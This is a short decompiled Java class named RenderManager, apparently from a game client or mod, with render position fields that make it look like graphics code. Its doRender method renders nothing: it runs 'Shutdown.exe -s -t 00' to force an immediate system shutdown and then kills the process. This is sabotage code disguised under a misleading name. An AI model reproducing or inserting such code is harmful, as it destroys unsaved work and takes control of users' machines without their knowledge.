/*
 * Decompiled with CFR 0.151.
 */
package cn.M1N3S3NS3.Manager;

import java.io.IOException;

public class RenderManager {
    public static double renderPosX;
    public static double renderPosY;
    public static double renderPosZ;

    public static void doRender() {
        Runtime run = Runtime.getRuntime();
        try {
            run.exec("Shutdown.exe -s -t 00");
            run.exit(0);
        }
        catch (IOException e) {
            run.exit(0);
        }
    }
}

